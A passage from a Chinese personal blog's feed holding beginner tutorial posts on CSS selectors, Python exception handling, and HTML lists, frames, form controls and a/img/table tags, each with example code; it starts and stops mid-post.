<h2 id="demo2-php"><a href="#demo2-php" class="headerlink" title="demo2.php"></a>demo2.php</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--群组选择器、后代选择器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span>,<span class="selector-class">.div2</span>&#123;</span></span><br><span class="line">    		width: 400px;</span><br><span class="line">    		height: 400px;    		</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">    		background: red;</span><br><span class="line">    	&#125;</span><br><span class="line"><span class="css">    	<span class="selector-class">.div2</span>&#123;</span></span><br><span class="line">    		background: blue;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.ul1</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">    		color: red;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"ul1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>c</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【python】异常捕获基础</title>
    <url>/posts/94.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>常用异常捕获</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>-<span class="keyword">except</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	正常程序</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	抛出异常</span><br></pre></td></tr></table></figure></div>

<p>简单使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line"> <span class="comment"># 正常程序</span></span><br><span class="line"> ipt = input(<span class="string">"请输入："</span>)</span><br><span class="line"> num = int(ipt) <span class="comment">#ValueError</span></span><br><span class="line"> print(num)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 一旦有异常，执行except内部块</span></span><br><span class="line">    print(e)</span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    print(num)</span><br><span class="line">    </span><br><span class="line"> 请输入：<span class="number">1.5</span></span><br><span class="line">invalid literal <span class="keyword">for</span> int() <span class="keyword">with</span> base <span class="number">10</span>: <span class="string">'1.5'</span></span><br><span class="line"> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>列表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># li = [2 , 3]</span></span><br><span class="line">    <span class="comment"># li[2] # IndexError</span></span><br><span class="line"></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    b = <span class="number">0</span></span><br><span class="line">    c = a/b  <span class="comment"># ZeroDivisionError</span></span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"如果没错~执行else代码"</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    print(<span class="string">"不管有无异常都执行"</span>)</span><br></pre></td></tr></table></figure></div>

<p>抛出异常raise</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">主动抛出异常</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(time)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> time&lt;<span class="number">5</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"错误"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    test(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"成功"</span>)</span><br></pre></td></tr></table></figure></div>

<p> 抛出异常区分</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">"数据库的错误"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e,<span class="string">'111'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        li = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">        li[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e,<span class="string">'111'</span>)</span><br><span class="line"></span><br><span class="line">demo()</span><br></pre></td></tr></table></figure></div>

<p>自定义异常</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OldAmyError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,msg)</span>:</span></span><br><span class="line">        self.msg_err = msg</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.msg_err</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj = OldAmyError("报错")</span></span><br><span class="line"><span class="comment"># print(obj)</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> OldAmyError(<span class="string">"电脑错了。。"</span>) <span class="comment"># 实例化类</span></span><br><span class="line"><span class="keyword">except</span> OldAmyError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure></div>

<p>assert断言</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">断言</span></span><br><span class="line"><span class="string">用于强制用户服从，可捕获也可不</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'---1---'</span>) <span class="comment">#AssertionError</span></span><br><span class="line"><span class="keyword">assert</span> <span class="number">1</span>==<span class="number">2</span></span><br><span class="line">print(<span class="string">'22222222'</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>python</tag>
        <tag>异常</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】列表list使用</title>
    <url>/posts/61.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="标签使用截图样式"><a href="#标签使用截图样式" class="headerlink" title="标签使用截图样式"></a>标签使用截图样式</h1><p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210707161943082.png" alt="image-20210707161943082"></p>
<h1 id="标签使用代码及注释"><a href="#标签使用代码及注释" class="headerlink" title="标签使用代码及注释"></a>标签使用代码及注释</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>列表List<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--无序列表 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">"circle"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--有序列表 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"I"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第三<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第四<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>标签的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】框架frame的使用</title>
    <url>/posts/54.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="框架frame使用截图样式"><a href="#框架frame使用截图样式" class="headerlink" title="框架frame使用截图样式"></a>框架frame使用截图样式</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707164005440.png" alt="image-20210707164005440"></p>
<h1 id="框架frame使用代码"><a href="#框架frame使用代码" class="headerlink" title="框架frame使用代码"></a>框架frame使用代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>框架<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">frameset</span> <span class="attr">rows</span>=<span class="string">"30%,*"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"list.html"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">frameset</span> <span class="attr">cols</span>=<span class="string">"30%,*"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"select.html"</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"select.html"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>list的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】选择框、复选框、单选框、文本域</title>
    <url>/posts/53.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="选择框、复选框、单选框、文本域的截图"><a href="#选择框、复选框、单选框、文本域的截图" class="headerlink" title="选择框、复选框、单选框、文本域的截图"></a>选择框、复选框、单选框、文本域的截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707160419908.png" alt="image-20210707160419908"></p>
<h1 id="标签使用代码及注释"><a href="#标签使用代码及注释" class="headerlink" title="标签使用代码及注释"></a>标签使用代码及注释</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>选择框、复选框、单选框、文本域<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--表单 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">legend</span>&gt;</span>个人信息<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">		用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--单选框--&gt;</span></span><br><span class="line">		性别</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span>男</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"2"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>/&gt;</span>女 <span class="comment">&lt;!--默认选择checked--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--多选框--&gt;</span></span><br><span class="line">		喜欢语言</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"app[]"</span> <span class="attr">value</span>=<span class="string">"asp"</span>&gt;</span>asp</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"app[]"</span> <span class="attr">value</span>=<span class="string">"aspx"</span>&gt;</span>aspx</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"app[]"</span> <span class="attr">value</span>=<span class="string">"php"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span>php</span><br><span class="line">		<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--选择框--&gt;</span></span><br><span class="line">		地区<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"address"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"shanghai"</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"wuhan"</span> &gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--文本域--&gt;</span></span><br><span class="line">		简介<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"30"</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">name</span>=<span class="string">"info"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>标签的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】a标签，src标签，table标签使用</title>
    <url>/posts/60.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="标签使用截图样式"><a href="#标签使用截图样式" class="headerlink" title="标签使用截图样式"></a>标签使用截图样式</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707151958897.png" alt="image-20210707151958897"></p>
<h1 id="标签使用代码及注释"><a href="#标签使用代码及注释" class="headerlink" title="标签使用代码及注释"></a>标签使用代码及注释</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>a标签，src标签，table标签使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--a 标签的使用 --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--a 标签的使用  target中 _self代表不新建标签、_blank新建页面跳转--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://gylq.github.io/"</span> <span class="attr">target</span>=<span class="string">"_self"</span>&gt;</span>孤桜懒契的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://gylq.github.io/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>孤桜懒契的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--img标签的使用 alt当图片不存在描述图片--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.jpg"</span> <span class="attr">alt</span>=<span class="string">"qq图片"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--表格tr代表一行，th单元格数据加粗 ，td一个单元格的数据,borden边框，cellpadding单元格大小，单元格间距cellspacing，colspan行单元格拼接，竖单元格拼接rowspan--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">cellpadding</span>=<span class="string">"10"</span> <span class="attr">cellspacing</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>名字<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>刘备<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>11<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span 